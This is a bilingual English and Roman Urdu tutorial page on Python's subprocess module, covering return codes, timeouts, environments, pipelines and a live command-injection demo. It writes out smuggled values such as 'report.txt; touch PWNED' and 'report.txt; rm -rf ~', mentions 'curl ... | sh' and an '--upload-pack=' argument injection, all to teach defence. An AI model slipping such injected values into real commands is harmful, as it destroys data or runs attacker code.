@@ -1,0 +1,812 @@
+---
+title: "Running Commands with subprocess"
+summary: "Automation often means gluing existing tools together: git, docker, kubectl, terraform, systemctl. Python's subprocess module runs them, captures their output and reacts to failures. Learn from zero subprocess.run with a list of arguments, capture_output and text, return codes and check=True, CalledProcessError, FileNotFoundError and TimeoutExpired, passing input, cwd and a controlled environment, why shell=True with user input is command injection (shown live), shlex.quote and shlex.split, shutil.which, building a pipeline without a shell, and streaming output with Popen. All verified with Python 3.13 on Linux."
+level: intermediate
+minutes: 35
+prerequisites: ["Command-Line Tools with argparse", "Exceptions and Error Handling"]
+tags: ["Python", "subprocess", "Automation", "Security"]
+---
+
+<BigIdea>
+<Tr>
+<En>
+Many automation tasks are best done by running programs that already exist: `git` to inspect a repository, `docker` to build an image, `kubectl` to check pods, `pg_dump` to back up a database. The **`subprocess`** module starts such a program as a **child process** and lets your script wait for it, read what it printed and see whether it succeeded. The workhorse is **`subprocess.run(["git", "status", "--short"], capture_output=True, text=True)`**. Pass the command as a **list**: the program name followed by each argument as its own string. `capture_output=True` collects **stdout** and **stderr**, `text=True` decodes them to strings, and the result's **`returncode`** tells you what happened (0 means success). A failing command does **not** raise by default, so add **`check=True`** to get a `CalledProcessError`, and always set a **`timeout`** so a hung command can't block your script forever. A missing program raises `FileNotFoundError`. You can pass **input**, run in another folder with **`cwd`**, and control the child's **environment** with `env`. The biggest danger is **`shell=True`** with any outside data: the string is interpreted by a shell, so a value like `report.txt; rm -rf ~` runs a second command. That's **command injection**. Use lists and no shell; if you truly need shell features, quote every value with `shlex.quote`. For pipelines and live output, `subprocess.Popen` gives you lower-level control.
+</En>
+<Ur>
+Kai automation ke kaam pehle se mojood programs chala kar behtareen hote hain: repository dekhne ke liye `git`, image banane ke liye `docker`, pods check karne ke liye `kubectl`, database backup ke liye `pg_dump`. **`subprocess`** module aisa program **child process** ke taur par shuru karta aur aap ki script ko us ka intezar karne, us ka print kiya parhne aur kamyabi dekhne deta hai. Asal kaam ka ghora **`subprocess.run(["git", "status", "--short"], capture_output=True, text=True)`** hai. Command **list** ki shakal me dein: program ka naam aur har argument apni alag string. `capture_output=True` **stdout** aur **stderr** jama karta, `text=True` unhe strings me decode karta, aur natije ka **`returncode`** batata hai kya hua (0 matlab kamyabi). Nakam command default me error **nahi** uthati, isliye `CalledProcessError` ke liye **`check=True`** jorein, aur hamesha **`timeout`** lagayen taa ke atki command aap ki script hamesha ke liye na rok sake. Ghayab program `FileNotFoundError` uthata hai. Aap **input** de sakte, **`cwd`** se doosre folder me chala sakte, aur `env` se child ka **environment** qaboo kar sakte hain. Sab se bara khatra bahar ke kisi bhi data ke saath **`shell=True`** hai: string shell parhta hai, isliye `report.txt; rm -rf ~` jaisi value doosri command chala deti hai. Ye **command injection** hai. Lists lein aur shell nahi; agar sach me shell ki khoobiyan chahiye to har value `shlex.quote` se quote karein. Pipelines aur live output ke liye `subprocess.Popen` zyada qaboo deta hai.
+</Ur>
+</Tr>
+</BigIdea>
+
+## At a glance
+
+<Glance>
+<What>
+<Tr>
+<En>
+
+| `subprocess.run(cmd, ...)` | Effect |
+| --- | --- |
+| `cmd` as a list | `["git", "log", "-1"]`: no shell, no injection |
+| `capture_output=True` | collect stdout and stderr |
+| `text=True` | strings instead of bytes |
+| `check=True` | raise `CalledProcessError` on non-zero exit |
+| `timeout=30` | raise `TimeoutExpired` and kill the child |
+| `input="..."` | send data to its stdin |
+| `cwd="/srv/app"` | run in that folder |
+| `env={...}` | the child's environment (copy `os.environ` to extend it) |
+
+| Exception | Means |
+| --- | --- |
+| `FileNotFoundError` | the program isn't installed or not on PATH |
+| `CalledProcessError` | it ran and exited non-zero (with `check=True`) |
+| `TimeoutExpired` | it took longer than `timeout` |
+| `PermissionError` | the file isn't executable |
+
+</En>
+<Ur>
+
+| `subprocess.run(cmd, ...)` | Asar |
+| --- | --- |
+| list ki shakal me `cmd` | `["git", "log", "-1"]`: shell nahi, injection nahi |
+| `capture_output=True` | stdout aur stderr jama |
+| `text=True` | bytes ke bajaye strings |
+| `check=True` | non-zero exit par `CalledProcessError` |
+| `timeout=30` | `TimeoutExpired` uthao aur child khatam karo |
+| `input="..."` | us ke stdin ko data bhejna |
+| `cwd="/srv/app"` | us folder me chalana |
+| `env={...}` | child ka environment (barhane ke liye `os.environ` copy karein) |
+
+| Exception | Matlab |
+| --- | --- |
+| `FileNotFoundError` | program install nahi ya PATH par nahi |
+| `CalledProcessError` | chala aur non-zero exit kiya (`check=True` ke saath) |
+| `TimeoutExpired` | `timeout` se zyada waqt laga |
+| `PermissionError` | file executable nahi |
+
+</Ur>
+</Tr>
+</What>
+<Why>
+<Tr>
+<En>
+
+- Python is a better "glue" than bash once logic, error handling and data parsing get involved.
+- CLI tools (git, docker, kubectl, terraform, aws) often have no Python library, or the CLI is simplest.
+- Handling exit codes and timeouts properly is what separates a reliable script from one that silently does half the job.
+
+</En>
+<Ur>
+
+- Jab logic, error handling aur data parsing shamil ho to Python bash se behtar "gond" hai.
+- CLI tools (git, docker, kubectl, terraform, aws) ki aksar Python library nahi hoti, ya CLI hi sab se aasan hai.
+- Exit codes aur timeouts sahi sambhalna hi bharose wali script ko us script se alag karta jo khamoshi se aadha kaam karti hai.
+
+</Ur>
+</Tr>
+</Why>
+<When>
+<Tr>
+<En>
+
+| Situation | Choose |
+| --- | --- |
+| Run a command and use its output | `subprocess.run([...], capture_output=True, text=True, check=True, timeout=...)` |
+| Long-running command with live output | `subprocess.Popen` and iterate `proc.stdout` |
+| Pipe one command into another | two `Popen` objects, or do the second step in Python |
+| A Python library exists (boto3, docker SDK, GitPython) | often prefer the library: structured data, better errors |
+| Simple file operations (copy, move, delete) | `shutil` and `pathlib`, not `cp`, `mv`, `rm` |
+| Many commands in parallel | `ThreadPoolExecutor` or `asyncio.create_subprocess_exec` |
+
+</En>
+<Ur>
+
+| Halat | Chunein |
+| --- | --- |
+| Command chala kar us ka output istemal | `subprocess.run([...], capture_output=True, text=True, check=True, timeout=...)` |
+| Live output wali lambi command | `subprocess.Popen` aur `proc.stdout` par loop |
+| Ek command doosri me pipe | do `Popen` objects, ya doosra qadam Python me |
+| Python library mojood (boto3, docker SDK, GitPython) | aksar library behtar: structured data, behtar errors |
+| Saade file kaam (copy, move, delete) | `shutil` aur `pathlib`, `cp`, `mv`, `rm` nahi |
+| Kai commands ek saath | `ThreadPoolExecutor` ya `asyncio.create_subprocess_exec` |
+
+</Ur>
+</Tr>
+</When>
+<How>
+<Tr>
+<En>
+
+```text
+import subprocess
+
+def current_commit(repo):
+    r = subprocess.run(
+        ["git", "rev-parse", "--short", "HEAD"],
+        cwd=repo, capture_output=True, text=True, check=True, timeout=10,
+    )
+    return r.stdout.strip()
+```
+
+</En>
+<Ur>
+
+```text
+import subprocess
+
+def current_commit(repo):
+    r = subprocess.run(
+        ["git", "rev-parse", "--short", "HEAD"],
+        cwd=repo, capture_output=True, text=True, check=True, timeout=10,
+    )
+    return r.stdout.strip()
+```
+
+</Ur>
+</Tr>
+</How>
+</Glance>
+
+## Picture it
+
+<Tr>
+<En>
+
+Think of **handing a job to a contractor**.
+
+- The list form is a written work order with each instruction in its own box: "cat", "report.txt; touch PWNED". The contractor does exactly that and treats the odd file name as a file name.
+- `shell=True` is reading the work order out loud to a foreman who interprets it. If the order contains "...; also knock down the wall", the foreman does that too.
+- `capture_output` is asking for the contractor's report (stdout) and complaints (stderr); `returncode` is whether they say the job succeeded.
+- `timeout` is "if you're not done by 5 pm, stop": without it, a stuck contractor keeps you waiting forever.
+
+</En>
+<Ur>
+
+**Contractor ko kaam saunpna** socheyn.
+
+- List ki shakal likha hua work order hai jis me har hidayat apne khaane me hai: "cat", "report.txt; touch PWNED". Contractor bilkul wahi karta aur ajeeb file ke naam ko file ka naam hi samajhta hai.
+- `shell=True` work order ko zor se aise foreman ko parh kar sunana hai jo uski tashreeh karta hai. Agar order me "...; saath me deewar bhi gira do" ho, to foreman woh bhi kar deta hai.
+- `capture_output` contractor ki report (stdout) aur shikayaten (stderr) maangna hai; `returncode` ye ke woh kehte hain kaam kamyab hua ya nahi.
+- `timeout` "5 baje tak khatam na ho to ruk jao" hai: is ke baghair atka contractor aap ko hamesha intezar karwata hai.
+
+</Ur>
+</Tr>
+
+## Words you'll see
+
+<Tr>
+<En>
+
+| Word | What it means | Example |
+| --- | --- | --- |
+| **Child process** | A program your script starts | `git` run from Python |
+| **Argument list** | Program plus each argument separately | `["ls", "-l", path]` |
+| **stdout / stderr** | Normal output / error output | `r.stdout`, `r.stderr` |
+| **Return code** | Exit status; 0 = success | `r.returncode` |
+| **check=True** | Raise on non-zero exit | `CalledProcessError` |
+| **Timeout** | Maximum run time | `timeout=30` |
+| **Shell** | Program that interprets command strings | `/bin/sh`, bash |
+| **Command injection** | Untrusted input running extra commands | `; touch PWNED` |
+| **shlex.quote** | Makes a value safe for a shell | `'report.txt; ...'` |
+| **PATH** | Folders searched for programs | `shutil.which("git")` |
+| **Popen** | Low-level process object | streaming, pipelines |
+| **Pipe** | Connects one program's output to another's input | `stdout=PIPE` |
+
+</En>
+<Ur>
+
+| Lafz | Matlab | Misaal |
+| --- | --- | --- |
+| **Child process** | Aap ki script ka shuru kiya program | Python se chala `git` |
+| **Argument list** | Program aur har argument alag | `["ls", "-l", path]` |
+| **stdout / stderr** | Aam output / error output | `r.stdout`, `r.stderr` |
+| **Return code** | Exit status; 0 = kamyabi | `r.returncode` |
+| **check=True** | Non-zero exit par error | `CalledProcessError` |
+| **Timeout** | Zyada se zyada chalne ka waqt | `timeout=30` |
+| **Shell** | Command strings ki tashreeh karne wala program | `/bin/sh`, bash |
+| **Command injection** | Na-qabil-e-bharosa input ka zayed commands chalana | `; touch PWNED` |
+| **shlex.quote** | Value ko shell ke liye mehfooz banata | `'report.txt; ...'` |
+| **PATH** | Programs dhoondne wale folders | `shutil.which("git")` |
+| **Popen** | Nichle level ka process object | streaming, pipelines |
+| **Pipe** | Ek program ka output doosre ke input se jorta | `stdout=PIPE` |
+
+</Ur>
+</Tr>
+
+## Learn it step by step
+
+<Walkthrough>
+
+<Step title="run, return codes, check, errors, timeouts, input, cwd and env">
+
+<Tr>
+<En>
+`run_basics.py` runs `git --version` and reads its output, runs `ls` on a missing folder with and without `check=True`, tries a misspelled program, kills a command that runs too long, pipes text into `sort`, runs `pwd` in another folder, and starts a child Python with a minimal, explicit environment. (Error messages from `ls` look slightly different on macOS.)
+</En>
+<Ur>
+`run_basics.py` `git --version` chala kar us ka output parhti, `check=True` ke saath aur baghair ghayab folder par `ls` chalati, ghalat spelling wala program aazmati, zyada der chalne wali command khatam karti, `sort` me text pipe karti, doosre folder me `pwd` chalati, aur kam se kam, wazeh environment ke saath child Python shuru karti hai. (macOS par `ls` ke error paighamat thore mukhtalif dikhte hain.)
+</Ur>
+</Tr>
+
+```bash
+cat > run_basics.py <<'EOF'
+import subprocess, sys
+
+# 1. Run a command, capture its output as text
+r = subprocess.run(["git", "--version"], capture_output=True, text=True)
+print("returncode:", r.returncode, "| stdout starts with:", r.stdout.split()[0:2])
+
+# 2. Non-zero exit codes do NOT raise by default...
+r = subprocess.run(["ls", "no-such-dir"], capture_output=True, text=True)
+print("returncode:", r.returncode, "| stderr:", r.stderr.strip())
+
+# ...unless you pass check=True
+try:
+    subprocess.run(["ls", "no-such-dir"], capture_output=True, text=True, check=True)
+except subprocess.CalledProcessError as e:
+    print(f"CalledProcessError: exit {e.returncode}, cmd={e.cmd}")
+
+# 3. A missing program is a different error
+try:
+    subprocess.run(["terraformm", "plan"])
+except FileNotFoundError as e:
+    print("FileNotFoundError:", e.filename)
+
+# 4. Timeouts kill commands that hang
+try:
+    subprocess.run([sys.executable, "-c", "import time; time.sleep(10)"], timeout=0.5)
+except subprocess.TimeoutExpired as e:
+    print(f"TimeoutExpired after {e.timeout}s")
+
+# 5. Input, working directory and environment
+r = subprocess.run(["sort", "-r"], input="web01\ndb01\ncache01\n", capture_output=True, text=True, check=True)
+print("sorted:", r.stdout.split())
+r = subprocess.run(["pwd"], cwd="/tmp", capture_output=True, text=True, check=True)
+print("ran in:", r.stdout.strip())
+env = {"PATH": "/usr/bin:/bin", "APP_ENV": "staging"}          # a minimal, explicit environment
+r = subprocess.run([sys.executable, "-c", "import os; print(os.environ.get('APP_ENV'), 'HOME' in os.environ)"],
+                   env=env, capture_output=True, text=True, check=True)
+print("child sees:", r.stdout.strip())
+EOF
+python3 run_basics.py
+```
+
+```text output
+returncode: 0 | stdout starts with: ['git', 'version']
+returncode: 2 | stderr: ls: cannot access 'no-such-dir': No such file or directory
+CalledProcessError: exit 2, cmd=['ls', 'no-such-dir']
+FileNotFoundError: terraformm
+TimeoutExpired after 0.5s
+sorted: ['web01', 'db01', 'cache01']
+ran in: /tmp
+child sees: staging False
+```
+
+<Happened>
+<Tr>
+<En>
+
+- `capture_output=True, text=True` gave us `r.stdout` as a string we could split; **returncode 0** means success.
+- `ls no-such-dir` exited with **2** and wrote its complaint to **stderr**, but `run` did **not** raise: without `check=True`, a script would carry on as if everything worked. With `check=True` we got **CalledProcessError** carrying the exit code and the command.
+- The misspelled `terraformm` raised **FileNotFoundError**: the program couldn't even start. That's a different failure from "started and failed", so handle both.
+- `timeout=0.5` killed the sleeping child and raised **TimeoutExpired**. Every external command in automation needs a timeout.
+- `input=` fed lines to `sort -r`, `cwd="/tmp"` ran `pwd` there without changing our own directory, and `env={...}` gave the child **only** PATH and APP_ENV, so it saw `staging` and **no HOME**. To add a variable while keeping the rest, pass `{**os.environ, "APP_ENV": "staging"}`. Passing a minimal environment is a good way to avoid leaking secrets to tools that don't need them.
+
+</En>
+<Ur>
+
+- `capture_output=True, text=True` ne `r.stdout` string ki shakal me diya jise hum tor sakte the; **returncode 0** matlab kamyabi.
+- `ls no-such-dir` **2** ke saath nikla aur apni shikayat **stderr** par likhi, magar `run` ne error **nahi** uthaya: `check=True` ke baghair script aise jaari rehti jaise sab theek chala. `check=True` ke saath humein exit code aur command wala **CalledProcessError** mila.
+- Ghalat spelling wale `terraformm` ne **FileNotFoundError** uthaya: program shuru bhi nahi ho saka. Ye "shuru ho kar nakam" se mukhtalif nakami hai, isliye dono sambhalein.
+- `timeout=0.5` ne sote child ko khatam kiya aur **TimeoutExpired** uthaya. Automation ki har bahari command ko timeout chahiye.
+- `input=` ne `sort -r` ko lines din, `cwd="/tmp"` ne apna folder badle baghair wahan `pwd` chalaya, aur `env={...}` ne child ko **sirf** PATH aur APP_ENV diye, isliye usne `staging` dekha aur **HOME nahi**. Baqi rakhte hue variable jorne ke liye `{**os.environ, "APP_ENV": "staging"}` dein. Kam se kam environment dena un tools tak secrets leak hone se bachane ka acha tareeqa hai jinhe unki zaroorat nahi.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+<Step title="Command injection, quoting, which, pipelines and streaming">
+
+<Tr>
+<En>
+`run_safe.py` treats a file name as if it came from a user, `report.txt; touch PWNED`, and runs `cat` on it first with `shell=True` and then with a list. It quotes and splits strings with `shlex`, checks programs with `shutil.which`, connects `printf` to `grep -c` without a shell, and streams the output of a slow command line by line with `Popen`. The injected command only creates an empty file in the demo folder.
+</En>
+<Ur>
+`run_safe.py` file ke naam ko aise samajhti jaise user se aaya ho, `report.txt; touch PWNED`, aur us par pehle `shell=True` aur phir list ke saath `cat` chalati hai. `shlex` se strings quote aur torti, `shutil.which` se programs check karti, shell ke baghair `printf` ko `grep -c` se jorti, aur `Popen` se dheemi command ka output line ba line stream karti hai. Inject hui command demo folder me sirf khaali file banati hai.
+</Ur>
+</Tr>
+
+```bash
+cat > run_safe.py <<'EOF'
+import os, shlex, shutil, subprocess, sys
+
+open("report.txt", "w").write("ok\n")
+name = "report.txt; touch PWNED"                 # imagine this came from a user or a web form
+
+# DANGEROUS: the string goes through a shell, so ";" starts a second command
+subprocess.run(f"cat {name}", shell=True, capture_output=True, text=True)
+print("shell=True created PWNED:", os.path.exists("PWNED"))
+os.remove("PWNED")
+
+# SAFE: a list is passed straight to the program; the whole name is one argument
+r = subprocess.run(["cat", name], capture_output=True, text=True)
+print("list form:", r.returncode, "|", r.stderr.strip(), "| PWNED exists:", os.path.exists("PWNED"))
+
+# If you truly need a shell, quote every untrusted value
+print("quoted:", shlex.quote(name))
+print("split :", shlex.split("git commit -m 'fix login bug'"))
+
+# Find programs before running them
+print("which git:", bool(shutil.which("git")), "| which terraformm:", shutil.which("terraformm"))
+
+# A pipeline without a shell: printf | grep -c ERROR
+p1 = subprocess.Popen(["printf", "INFO a\nERROR b\nERROR c\n"], stdout=subprocess.PIPE)
+p2 = subprocess.Popen(["grep", "-c", "ERROR"], stdin=p1.stdout, stdout=subprocess.PIPE, text=True)
+p1.stdout.close()                                # let p1 get SIGPIPE if p2 exits early
+print("errors counted by grep:", p2.communicate()[0].strip())
+
+# Stream output line by line from a long-running command
+cmd = [sys.executable, "-u", "-c", "import time\nfor i in range(3):\n    print(f'step {i+1}/3'); time.sleep(0.1)"]
+with subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True) as proc:
+    for line in proc.stdout:
+        print("  live:", line.rstrip())
+print("exit code:", proc.returncode)
+EOF
+python3 run_safe.py
+```
+
+```text output
+shell=True created PWNED: True
+list form: 1 | cat: 'report.txt; touch PWNED': No such file or directory | PWNED exists: False
+quoted: 'report.txt; touch PWNED'
+split : ['git', 'commit', '-m', 'fix login bug']
+which git: True | which terraformm: None
+errors counted by grep: 2
+  live: step 1/3
+  live: step 2/3
+  live: step 3/3
+exit code: 0
+```
+
+<Happened>
+<Tr>
+<En>
+
+- With `shell=True`, the shell saw `cat report.txt; touch PWNED` as **two commands**, and the second one ran: **PWNED was created**. An attacker would use `curl ... | sh` or `rm -rf` instead of `touch`. This is one of the most common vulnerabilities in automation and web backends.
+- The list form passed the whole string as **one argument** to `cat`, which simply reported that no file has that strange name (exit 1). Nothing else ran.
+- `shlex.quote` wraps a value so a shell treats it as plain text; use it only when you genuinely need a shell. `shlex.split` turns a command string into a correct list, respecting quotes.
+- `shutil.which` returned a path for git and **None** for the typo, so you can fail early with a helpful message.
+- Two `Popen` objects connected `printf`'s stdout to `grep`'s stdin, the equivalent of `printf ... | grep -c ERROR` with no shell involved. Often it's even simpler to read the output into Python and filter there.
+- `Popen` with `stdout=PIPE` let us print each **live** line as the child produced it (the `-u` flag stops Python buffering the child's output), which is what you want for builds, deploys and long migrations.
+
+</En>
+<Ur>
+
+- `shell=True` ke saath shell ne `cat report.txt; touch PWNED` ko **do commands** dekha, aur doosri chal gayi: **PWNED ban gayi**. Hamla awar `touch` ke bajaye `curl ... | sh` ya `rm -rf` istemal karega. Ye automation aur web backends ki sab se aam kamzoriyon me se hai.
+- List wali shakal ne poori string `cat` ko **ek argument** ke taur par di, jis ne bas bataya ke is ajeeb naam ki koi file nahi (exit 1). Aur kuch nahi chala.
+- `shlex.quote` value ko aise lapetta ke shell use saada text samjhe; ise sirf tab lein jab sach me shell chahiye. `shlex.split` quotes ka khayal rakhte hue command string ko durust list banata hai.
+- `shutil.which` ne git ke liye path aur ghalat spelling ke liye **None** lautaya, taa ke aap madadgar paigham ke saath jaldi nakam ho sakein.
+- Do `Popen` objects ne `printf` ka stdout `grep` ke stdin se jora, baghair shell ke `printf ... | grep -c ERROR` ke barabar. Aksar output Python me parh kar wahin chhaanna aur bhi aasan hai.
+- `stdout=PIPE` wale `Popen` ne har **live** line print karne di jaise hi child ne banayi (`-u` flag Python ko child ka output buffer karne se rokta hai), jo builds, deploys aur lambi migrations ke liye chahiye.
+
+</Ur>
+</Tr>
+</Happened>
+
+</Step>
+
+</Walkthrough>
+
+## Common mistakes
+
+<Compare>
+<Bad title="Shell strings with outside data, no checks">
+
+```text
+branch = request.args["branch"]
+os.system(f"git checkout {branch}")                       # injection; exit code ignored
+subprocess.run(f"docker build -t {tag} .", shell=True)    # same problem
+```
+
+</Bad>
+<Good title="Lists, check, timeout, validation">
+
+```text
+if not re.fullmatch(r"[A-Za-z0-9._/-]{1,100}", branch):
+    raise ValueError("invalid branch name")
+subprocess.run(["git", "checkout", "--", branch], check=True, timeout=60)
+subprocess.run(["docker", "build", "-t", tag, "."], check=True, timeout=1800)
+```
+
+</Good>
+</Compare>
+
+<Compare>
+<Bad title="Ignoring failures and hangs">
+
+```text
+out = subprocess.run(["pg_dump", "shop"], capture_output=True).stdout
+open("backup.sql", "wb").write(out)          # empty file if pg_dump failed; no timeout
+print("backup done")
+```
+
+</Bad>
+<Good title="Fail loudly">
+
+```text
+try:
+    r = subprocess.run(["pg_dump", "shop"], capture_output=True, check=True, timeout=3600)
+except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
+    log.error("backup failed: %s", e)
+    raise SystemExit(1)
+Path("backup.sql").write_bytes(r.stdout)
+```
+
+</Good>
+</Compare>
+
+<Tr>
+<En>
+
+More mistakes to avoid:
+
+- **Using `os.system` or `os.popen`**: no output capture, poor error handling; use `subprocess`.
+- **Passing secrets as command-line arguments** (`mysql -pSECRET`): visible to other users via `ps`; use environment variables or config files with tight permissions.
+- **Forgetting `--` before user-supplied values**: a value like `--upload-pack=...` can be read as an option (argument injection).
+- **`capture_output` on commands that produce gigabytes**: write to a file with `stdout=f` instead.
+- **Assuming a command's output format never changes**: prefer machine-readable flags (`--format json`, `--porcelain`).
+
+</En>
+<Ur>
+
+Bachne wali mazeed ghaltiyan:
+
+- **`os.system` ya `os.popen` istemal karna**: output pakarna nahi, kamzor error handling; `subprocess` lein.
+- **Secrets command-line arguments ke taur par dena** (`mysql -pSECRET`): `ps` ke zariye doosre users ko nazar aate; environment variables ya sakht permissions wali config files lein.
+- **User ki di values se pehle `--` bhoolna**: `--upload-pack=...` jaisi value option samjhi ja sakti hai (argument injection).
+- **Gigabytes output dene wali commands par `capture_output`**: is ke bajaye `stdout=f` se file me likhein.
+- **Ye samajhna ke command ke output ka format kabhi nahi badlega**: machine ke parhne layak flags (`--format json`, `--porcelain`) ko tarjeeh dein.
+
+</Ur>
+</Tr>
+
+## Try it yourself
+
+<Challenge title="A safe run helper">
+
+<Tr>
+<En>
+Write `run(name, cmd, timeout=10)` that runs a command with `check=True`, captures text output and returns `(True, stdout)` on success, or `(False, message)` for a missing program, a timeout or a non-zero exit (include the first 60 characters of stderr). Use it on four checks: a working Python command, a misspelled `kubectll`, a Python command that exits with an error, and one that sleeps longer than a 1-second timeout.
+</En>
+<Ur>
+`run(name, cmd, timeout=10)` likhein jo `check=True` ke saath command chalaye, text output pakre aur kamyabi par `(True, stdout)`, ya ghayab program, timeout ya non-zero exit par `(False, message)` lautaye (stderr ke pehle 60 characters shamil karein). Ise chaar checks par istemal karein: kaam karti Python command, ghalat spelling wala `kubectll`, error ke saath nikalne wali Python command, aur 1 second ke timeout se zyada sone wali command.
+</Ur>
+</Tr>
+
+<Solution>
+
+<Tr>
+<En>
+
+```text
+import subprocess, sys
+
+def run(name, cmd, timeout=10):
+    """Run a command; return (ok, output) instead of raising."""
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=True)
+        return True, r.stdout.strip()
+    except FileNotFoundError:
+        return False, f"{cmd[0]}: not installed"
+    except subprocess.TimeoutExpired:
+        return False, f"{name}: timed out after {timeout}s"
+    except subprocess.CalledProcessError as e:
+        return False, f"{name}: exit {e.returncode}: {e.stderr.strip()[:60]}"
+
+checks = {
+    "python": [sys.executable, "-c", "print('ok')"],
+    "missing": ["kubectll", "version"],
+    "failing": [sys.executable, "-c", "import sys; sys.exit('config invalid')"],
+    "hanging": [sys.executable, "-c", "import time; time.sleep(5)"],
+}
+for name, cmd in checks.items():
+    ok, msg = run(name, cmd, timeout=1)
+    print(f"{name:<8} {'PASS' if ok else 'FAIL'}  {msg}")
+
+# python   PASS  ok
+# missing  FAIL  kubectll: not installed
+# failing  FAIL  failing: exit 1: config invalid
+# hanging  FAIL  hanging: timed out after 1s
+```
+
+</En>
+<Ur>
+
+```text
+import subprocess, sys
+
+def run(name, cmd, timeout=10):
+    """Run a command; return (ok, output) instead of raising."""
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=True)
+        return True, r.stdout.strip()
+    except FileNotFoundError:
+        return False, f"{cmd[0]}: not installed"
+    except subprocess.TimeoutExpired:
+        return False, f"{name}: timed out after {timeout}s"
+    except subprocess.CalledProcessError as e:
+        return False, f"{name}: exit {e.returncode}: {e.stderr.strip()[:60]}"
+
+checks = {
+    "python": [sys.executable, "-c", "print('ok')"],
+    "missing": ["kubectll", "version"],
+    "failing": [sys.executable, "-c", "import sys; sys.exit('config invalid')"],
+    "hanging": [sys.executable, "-c", "import time; time.sleep(5)"],
+}
+for name, cmd in checks.items():
+    ok, msg = run(name, cmd, timeout=1)
+    print(f"{name:<8} {'PASS' if ok else 'FAIL'}  {msg}")
+
+# python   PASS  ok
+# missing  FAIL  kubectll: not installed
+# failing  FAIL  failing: exit 1: config invalid
+# hanging  FAIL  hanging: timed out after 1s
+```
+
+</Ur>
+</Tr>
+
+</Solution>
+
+</Challenge>
+
+<Challenge title="Inspect a git repository">
+
+<Tr>
+<En>
+In a temporary directory, create a git repository with three commits (set a local user name and email first), add one uncommitted file, and use a small `git(*args, cwd)` helper built on `subprocess.run` to print the current branch, the number of commits, the last two commit messages, and the uncommitted changes from `git status --porcelain`.
+</En>
+<Ur>
+Temporary directory me teen commits wali git repository banayen (pehle local user name aur email set karein), ek uncommitted file jorein, aur `subprocess.run` par bane chhote `git(*args, cwd)` helper se mojooda branch, commits ki tadaad, aakhri do commit messages, aur `git status --porcelain` se uncommitted tabdeeliyan print karein.
+</Ur>
+</Tr>
+
+<Solution>
+
+<Tr>
+<En>
+
+```text
+import subprocess, tempfile
+from pathlib import Path
+
+def git(*args, cwd):
+    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, check=True).stdout.strip()
+
+with tempfile.TemporaryDirectory() as repo:
+    git("init", "-q", "-b", "main", cwd=repo)
+    git("config", "user.email", "jane@example.com", cwd=repo)
+    git("config", "user.name", "Jane Cooper", cwd=repo)
+    for i, msg in enumerate(["Add README", "Add CI workflow", "Fix login bug"]):
+        Path(repo, f"file{i}.txt").write_text(msg)
+        git("add", ".", cwd=repo)
+        git("commit", "-q", "-m", msg, cwd=repo)
+    Path(repo, "notes.txt").write_text("draft")
+    print("branch:", git("branch", "--show-current", cwd=repo))
+    print("commits:", git("rev-list", "--count", "HEAD", cwd=repo))
+    print("last 2:", git("log", "-2", "--format=%s", cwd=repo).splitlines())
+    print("uncommitted:", git("status", "--porcelain", cwd=repo).splitlines())
+
+# branch: main
+# commits: 3
+# last 2: ['Fix login bug', 'Add CI workflow']
+# uncommitted: ['?? notes.txt']
+```
+
+`--porcelain` and `--format` give stable, machine-readable output, unlike the human-friendly default.
+
+</En>
+<Ur>
+
+```text
+import subprocess, tempfile
+from pathlib import Path
+
+def git(*args, cwd):
+    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, check=True).stdout.strip()
+
+with tempfile.TemporaryDirectory() as repo:
+    git("init", "-q", "-b", "main", cwd=repo)
+    git("config", "user.email", "jane@example.com", cwd=repo)
+    git("config", "user.name", "Jane Cooper", cwd=repo)
+    for i, msg in enumerate(["Add README", "Add CI workflow", "Fix login bug"]):
+        Path(repo, f"file{i}.txt").write_text(msg)
+        git("add", ".", cwd=repo)
+        git("commit", "-q", "-m", msg, cwd=repo)
+    Path(repo, "notes.txt").write_text("draft")
+    print("branch:", git("branch", "--show-current", cwd=repo))
+    print("commits:", git("rev-list", "--count", "HEAD", cwd=repo))
+    print("last 2:", git("log", "-2", "--format=%s", cwd=repo).splitlines())
+    print("uncommitted:", git("status", "--porcelain", cwd=repo).splitlines())
+
+# branch: main
+# commits: 3
+# last 2: ['Fix login bug', 'Add CI workflow']
+# uncommitted: ['?? notes.txt']
+```
+
+`--porcelain` aur `--format` insaanon ke liye bane default ke bar-aks mustaqil, machine ke parhne layak output dete hain.
+
+</Ur>
+</Tr>
+
+</Solution>
+
+</Challenge>
+
+## Quick quiz
+
+<Quiz>
+<Question q="Why pass the command as a list instead of a string?">
+<Option>It's faster</Option>
+<Option correct>No shell interprets it, so values can't inject extra commands</Option>
+<Option>Strings aren't allowed</Option>
+<Explanation>Each list item is passed as one argument.</Explanation>
+</Question>
+<Question q="What does subprocess.run do by default when the command exits with code 1?">
+<Option>Raises CalledProcessError</Option>
+<Option correct>Returns normally with returncode 1</Option>
+<Option>Retries the command</Option>
+<Explanation>Use check=True to raise.</Explanation>
+</Question>
+<Question q="Which exception means the program isn't installed?">
+<Option>CalledProcessError</Option>
+<Option correct>FileNotFoundError</Option>
+<Option>TimeoutExpired</Option>
+<Explanation>The process never started.</Explanation>
+</Question>
+<Question q="What happened with shell=True and the name report.txt; touch PWNED?">
+<Option>cat failed and nothing else happened</Option>
+<Option correct>The shell ran a second command and created PWNED</Option>
+<Option>Python raised an error</Option>
+<Explanation>That's command injection.</Explanation>
+</Question>
+<Question q="How do you stream a command's output while it runs?">
+<Option>subprocess.run with capture_output</Option>
+<Option correct>Popen with stdout=PIPE and iterate over proc.stdout</Option>
+<Option>os.system</Option>
+<Explanation>run waits until the command finishes.</Explanation>
+</Question>
+</Quiz>
+
+## Remember
+
+<Takeaways>
+<Tr>
+<En>
+
+- `subprocess.run([...], capture_output=True, text=True, check=True, timeout=...)` is the safe default.
+- Handle `FileNotFoundError`, `CalledProcessError` and `TimeoutExpired` separately.
+- Never build shell strings from outside data; lists avoid injection, and `shlex.quote` is the fallback.
+- Control `cwd` and `env`; don't pass secrets as arguments.
+- Use `Popen` for streaming and pipelines, and prefer machine-readable output formats.
+
+</En>
+<Ur>
+
